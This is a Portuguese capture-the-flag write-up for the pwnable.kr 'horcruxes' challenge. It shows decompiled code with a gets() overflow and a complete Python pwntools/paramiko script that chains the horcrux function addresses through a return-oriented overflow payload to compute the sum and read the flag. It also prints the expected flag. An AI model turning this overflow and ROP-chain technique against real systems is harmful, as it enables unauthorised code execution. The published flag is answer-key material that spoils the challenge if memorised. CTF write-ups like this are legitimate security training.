
# Horcruxes
###### Solved by @Cubano2  
> Este é um CTF sobre Return-Oriented Programming [ROP]

## About the Challenge

A questão apresenta um binário executado sob um usuário privilegiado e um desafio baseado em ROP. O objetivo é encontrar todas as sete horcruxes de Voldemort e utilizá-las para obter a flag.

Autor: jiwon choi

## Solution  

A conexão com o desafio é feita via SSH:
```ssh horcruxes@pwnable.kr -p2222```

Dentro do ambiente, dois arquivos são disponibilizados: ```horcruxes``` e ```readme```. O conteúdo do ```readme``` indica a necessidade de conexão via netcat

```nc 0 9032```.

Colocando no terminal ```cat readme``` podemos ler o arquivo, dentro dele contém essa mensagem:

``` 
horcruxes@pwnable:~$ cat readme 
connect to port 9032 (nc 0 9032). the 'horcruxes' binary will be executed under horcruxes_pwn privilege. rop it to read the flag.
```
Além disso, menciona que o binário será executado sob um usuário com privilégios, reforçando a necessidade de um ataque ROP para leitura da flag.


## Análise do Binário

A análise do binário no Ghidra revela a função ropme(), que implementa um menu interativo. Cada opção (A-G) corresponde a uma função específica, representando uma horcrux e concedendo uma quantidade de experiência (EXP).
```
undefined4 ropme(void)
 
{

  int iVar1;

  ssize_t sVar2;

  char local_78 [100];

  int local_14;

  int local_10;

  printf("Select Menu:");

  __isoc99_scanf(&DAT_080a0519,&local_14);

  getchar();

  if (local_14 == a) {

    A();

  }

  else if (local_14 == b) {

    B();

  }

  else if (local_14 == c) {

    C();

  }

  else if (local_14 == d) {

    D();

  }

  else if (local_14 == e) {

    E();

  }

  else if (local_14 == f) {

    F();

  }

  else if (local_14 == g) {

    G();

  }

  else {

    printf("How many EXP did you earned? : ");

    gets(local_78);

    iVar1 = atoi(local_78);

    if (iVar1 == sum) {

      local_10 = open("flag",0);

      sVar2 = read(local_10,local_78,100);

      local_78[sVar2] = '\0';

      puts(local_78);

      close(local_10);

                    /* WARNING: Subroutine does not return */

      exit(0);

    }

    puts("You\'d better get more experience to kill Voldemort");

  }

  return 0;

}

```
A condição para a leitura da flag requer que a entrada do usuário seja igual ao valor armazenado na variável ```sum```.

## Identificação do valor de sum

A função init_ABCDEFG() inicializa os valores das horcruxes utilizando /dev/urandom e realiza a soma de todas elas:

```
void init_ABCDEFG(void)

{
  ssize_t sVar1;
  int iVar2;
  uint local_14;
  int local_10;
  
  local_10 = open("/dev/urandom",0);
  sVar1 = read(local_10,&local_14,4);
  if (sVar1 != 4) {
    puts("/dev/urandom error");
                    /* WARNING: Subroutine does not return */
    exit(0);
  }
  close(local_10);
  srand(local_14);
  iVar2 = rand();
  a = iVar2 * -0x21524111 + (uint)(0xcafebabd < (uint)(iVar2 * -0x21524111)) * 0x35014542;
  iVar2 = rand();
  b = iVar2 * -0x21524111 + (uint)(0xcafebabd < (uint)(iVar2 * -0x21524111)) * 0x35014542;
  iVar2 = rand();
  c = iVar2 * -0x21524111 + (uint)(0xcafebabd < (uint)(iVar2 * -0x21524111)) * 0x35014542;
  iVar2 = rand();
  d = iVar2 * -0x21524111 + (uint)(0xcafebabd < (uint)(iVar2 * -0x21524111)) * 0x35014542;
  iVar2 = rand();
  e = iVar2 * -0x21524111 + (uint)(0xcafebabd < (uint)(iVar2 * -0x21524111)) * 0x35014542;
  iVar2 = rand();
  f = iVar2 * -0x21524111 + (uint)(0xcafebabd < (uint)(iVar2 * -0x21524111)) * 0x35014542;
  iVar2 = rand();
  g = iVar2 * -0x21524111 + (uint)(0xcafebabd < (uint)(iVar2 * -0x21524111)) * 0x35014542;
  sum = g + a + b + c + d + e + f;
  return;
```
```sum = g + a + b + c + d + e + f;```

Portanto, para obter a flag, é necessário chamar todas as funções correspondentes às horcruxes, extrair seus valores e somá-los corretamente.

## Exploit 
O ataque é realizado através de um payload que explora um buffer overflow na entrada de XP, redirecionando a execução para as funções das horcruxes em sequência e coletando os valores de EXP.

```python3
#!/usr/bin/env python3
import paramiko
import time
from pwn import *

# Configuração da conexão SSH
host = "pwnable.kr"
port = 2222
username = "horcruxes"
password = "guest"

# Endereços das funções
func_A_addr = 0x0809FE4B
func_B_addr = 0x0809FE6A
func_C_addr = 0x0809FE89
func_D_addr = 0x0809FEA8
func_E_addr = 0x0809FEC7
func_F_addr = 0x0809FEE6
func_G_addr = 0x0809FF05

def ExtraExp(s):
    keyword1 = 'EXP +'
    keyword2 = 'EXP -'
    
    if keyword1 in s:
        start = s.find(keyword1) + len(keyword1)
    elif keyword2 in s:
        start = s.find(keyword2) + len(keyword2)
    else:
        return 0  # Retorna 0 se a linha não tiver EXP
    
    end = s.find(')', start)
    return int(s[start:end])


# Conectar via SSH
client = paramiko.SSHClient()
client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
client.connect(host, port, username, password)

# Abrir um shell interativo
ssh_shell = client.invoke_shell()
time.sleep(1)
ssh_shell.send("./horcruxes\n")
time.sleep(1)

# Ler a saída inicial
output = ssh_shell.recv(1024).decode()
print(output)

# Enviar opção "1" no menu
ssh_shell.send("1\n")
time.sleep(1)

output = ssh_shell.recv(1024).decode()
print(output)

# Enviar payload
payload = b'0' * 0x74 + b'\x00aaa' + p32(func_A_addr) + \
                               p32(func_B_addr) + \
                               p32(func_C_addr) + \
                               p32(func_D_addr) + \
                               p32(func_E_addr) + \
                               p32(func_F_addr) + \
                               p32(func_G_addr) + \
                               p32(0x0809FFFC)

ssh_shell.send(payload + b"\n")
time.sleep(1)

# Capturar saída das funções
output = ssh_shell.recv(2048).decode("latin1", errors="ignore")
print(output)

# Extrair os valores EXP
lines = output.split("\n")
A = ExtraExp(lines[1])
B = ExtraExp(lines[2])
C = ExtraExp(lines[3])
D = ExtraExp(lines[4])
E = ExtraExp(lines[5])
F = ExtraExp(lines[6])
G = ExtraExp(lines[7])

# Calcular soma
Sum = (A + B + C + D + E + F + G) % (2 ** 32)
if Sum > 0x7fffffff:
    Sum -= 2 ** 32
if Sum < 0x80000000 - 2 ** 32:
    Sum += 2 ** 32

# Enviar resposta final
ssh_shell.send("1\n")
time.sleep(1)

ssh_shell.send(f"{Sum}\n")
time.sleep(1)

# Capturar a saída final
output = ssh_shell.recv(1024).decode()
print(output)

# Fechar conexão
client.close()
```
## Resultado

O exploit quase conseguiu obter a flag, mas um problema foi encontrado: a saída do programa apresentava um número grande com um ```+-``` na frente (```+-921902179319921```). Modificações foram tentadas para corrigir esse comportamento, mas o site do desafio entrou em manutenção no dia seguinte, impossibilitando a conclusão do exploit.

## Flag esperada:
>`[Magic_spell_ls_4vad4_K3draV4]`

